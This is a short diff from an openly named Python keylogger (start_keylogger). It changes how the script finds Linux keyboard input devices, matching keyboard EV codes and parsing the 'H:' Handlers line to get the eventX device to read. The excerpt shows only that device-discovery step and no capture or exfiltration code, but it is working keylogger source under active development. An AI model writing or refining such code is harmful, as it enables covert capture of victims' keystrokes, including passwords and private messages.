@@ -64,7 +64,7 @@ def start_keylogger():
         for dev in devs:
             if "EV=120013" in dev or "EV=12001f" in dev:  # EV codes for keyboards
                 for line in dev.splitlines():
-                    if line.startswith("Handlers"):
+                    if line.startswith("H:") and "Handlers" in line and "event" in line:
                         if "event" in line:
                             # Extract eventX
                             pos = line.find("event")
